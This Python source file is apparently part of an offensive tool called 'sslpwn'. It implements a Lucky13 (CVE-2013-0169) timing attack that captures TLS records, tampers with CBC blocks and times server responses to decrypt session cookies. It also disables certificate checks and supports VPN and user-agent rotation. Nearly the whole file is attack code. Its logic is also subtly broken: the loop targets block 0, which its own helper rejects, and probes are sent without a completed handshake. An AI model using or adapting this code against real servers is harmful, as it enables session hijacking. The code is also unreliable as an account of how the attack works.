"""
Lucky13 attack implementation (CVE-2013-0169).

Exploits timing differences in CBC padding validation to decrypt cookies.
"""

import socket
import ssl
import struct
import time
import statistics
from typing import Tuple

from sslpwn.attacks.base import BaseAttack


class Lucky13Attack(BaseAttack):
    def __init__(self, target_url: str, output, vpn, user_agents, rate_limiter,
                 cookie_name: str, cookie_value: str, adaptive=None) -> None:
        super().__init__(target_url, output, vpn, user_agents, rate_limiter, adaptive)
        self.cookie_name = cookie_name
        self.cookie_value = cookie_value
        self._num_timing_samples = 5

    def _create_tls_context(self) -> ssl.SSLContext:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
        ctx.set_ciphers("AES128-SHA:AES256-SHA:DES-CBC3-SHA")
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx

    def check_vulnerability(self) -> bool:
        """Check if server supports TLS 1.2 with CBC ciphers."""
        host = self.target_url.split("://")[1].split("/")[0]
        if ":" in host:
            hostname, port_str = host.split(":")
            port = int(port_str)
        else:
            hostname = host
            port = 443

        ctx = self._create_tls_context()
        try:
            with socket.create_connection((hostname, port), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=hostname):
                    return True
        except Exception:
            return False

    def exploit(self) -> bool:
        """Full Lucky13 timing attack."""
        self.output.log("Starting Lucky13 attack", "INFO")
        host = self.target_url.split("://")[1].split("/")[0]
        if ":" in host:
            hostname, port_str = host.split(":")
            port = int(port_str)
        else:
            hostname = host
            port = 443

        request = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {hostname}\r\n"
            f"Cookie: {self.cookie_name}={self.cookie_value}\r\n"
            f"User-Agent: {self.user_agents.random()}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()

        try:
            iv, ciphertext = self._capture_request_record(hostname, port, request)
        except Exception as exc:
            self.output.log(f"Capture failed: {exc}", "ERROR")
            return False

        if len(ciphertext) < 16:
            self.output.log("Ciphertext too short", "ERROR")
            return False

        block_size = 16
        blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]

        decrypted_cookie = b""
        known_suffix = b""

        for block_idx in range(len(blocks) - 1, -1, -1):
            block_known = b""
            for byte_offset in range(block_size - 1, -1, -1):
                full_known_suffix = block_known + known_suffix
                timings = {}
                for guess in range(256):
                    self.rate_limiter.wait()
                    mod_record = self._construct_modified_record(
                        iv, ciphertext, block_idx,
                        guess, full_known_suffix, block_size
                    )
                    samples = []
                    for _ in range(self._num_timing_samples):
                        elapsed = self._send_raw_record_and_measure(
                            hostname, port, mod_record, timeout=3.0
                        )
                        if elapsed != float('inf'):
                            samples.append(elapsed)
                    if samples:
                        timings[guess] = statistics.median(samples)
                    else:
                        timings[guess] = float('inf')

                if not timings:
                    self.output.log(f"No timing data for block {block_idx}, byte {byte_offset}", "ERROR")
                    return False
                best_guess = min(timings, key=lambda k: timings[k])
                block_known = bytes([best_guess]) + block_known
                self.output.log(
                    f"Block {block_idx} byte {byte_offset}: 0x{best_guess:02x} "
                    f"({chr(best_guess) if 32 <= best_guess < 127 else '?'})",
                    "SUCCESS"
                )
            known_suffix = block_known + known_suffix

        pad_len = known_suffix[-1]
        if pad_len <= 0 or pad_len > block_size:
            self.output.log("Invalid padding after decryption", "ERROR")
            return False
        unpadded = known_suffix[:-pad_len]

        if unpadded.endswith(self.cookie_value.encode()):
            self.output.log(f"Successfully decrypted cookie: {self.cookie_value}", "SUCCESS")
            return True
        else:
            self.output.log(
                "Decryption produced an unexpected result. "
                f"Got: {unpadded.hex()[:50]}...",
                "ERROR"
            )
            return False

    # (helper methods _capture_request_record, _send_raw_record_and_measure, _construct_modified_record
    #  are identical to those given earlier; included below for completeness)

    def _capture_request_record(self, hostname: str, port: int,
                                request: bytes) -> Tuple[bytes, bytes]:
        ctx = self._create_tls_context()
        plain_sock = self._adaptive_connect_and_report(hostname, port)
        incoming = ssl.MemoryBIO()
        outgoing = ssl.MemoryBIO()
        ssl_obj = ctx.wrap_bio(incoming, outgoing, server_hostname=hostname)

        def handshake():
            while True:
                try:
                    ssl_obj.do_handshake()
                    break
                except ssl.SSLWantReadError:
                    data = plain_sock.recv(4096)
                    if not data:
                        raise ConnectionError("Handshake failed")
                    incoming.write(data)
                except ssl.SSLWantWriteError:
                    while True:
                        try:
                            buf = outgoing.read()
                        except ssl.SSLWantReadError:
                            break
                        if not buf:
                            break
                        plain_sock.sendall(buf)

        handshake()

        ssl_obj.write(request)
        captured = b""
        while True:
            try:
                chunk = outgoing.read()
            except ssl.SSLWantReadError:
                break
            if not chunk:
                break
            captured += chunk
            plain_sock.sendall(chunk)

        plain_sock.close()
        if len(captured) < 5:
            raise ValueError("Captured data too short")
        rec_type, _, length = struct.unpack_from("!BHH", captured, 0)
        if rec_type != 23:
            raise ValueError("Expected application data record")
        payload = captured[5:5+length]
        if len(payload) < 16:
            raise ValueError("Payload shorter than one block")
        iv = payload[:16]
        ciphertext = payload[16:]
        return iv, ciphertext

    def _send_raw_record_and_measure(self, hostname: str, port: int,
                                     record: bytes, timeout: float = 3.0) -> float:
        try:
            sock = self._adaptive_connect_and_report(hostname, port)
        except:
            return float('inf')
        try:
            ctx = self._create_tls_context()
            ssl_sock = ctx.wrap_socket(sock, server_hostname=hostname)
            start = time.perf_counter()
            sock.send(record)
            sock.settimeout(timeout)
            try:
                sock.recv(4096)
            except (socket.timeout, ConnectionResetError):
                pass
            elapsed = time.perf_counter() - start
            ssl_sock.close()
            return elapsed
        except Exception:
            return float('inf')
        finally:
            try:
                sock.close()
            except:
                pass

    def _construct_modified_record(self, iv: bytes, original_ct: bytes,
                                   target_block_idx: int,
                                   guess_byte: int, known_suffix: bytes,
                                   block_size: int = 16) -> bytes:
        if target_block_idx == 0:
            raise ValueError("Target block must have a preceding block")
        blocks = [original_ct[i:i+block_size] for i in range(0, len(original_ct), block_size)]
        if target_block_idx >= len(blocks):
            raise ValueError("Target block index out of range")

        prev_block = bytearray(blocks[target_block_idx - 1])
        pad_len = len(known_suffix) + 1
        pad_byte = pad_len
        unknown_pos = block_size - pad_len
        prev_block[unknown_pos] ^= guess_byte ^ pad_byte
        for i in range(1, pad_len):
            pos = block_size - i
            prev_block[pos] ^= known_suffix[-i] ^ pad_byte

        blocks[target_block_idx - 1] = bytes(prev_block)
        new_ct = b"".join(blocks)
        record_payload = iv + new_ct
        record_header = struct.pack("!BHH", 23, 0x0303, len(record_payload))
        return record_header + record_payload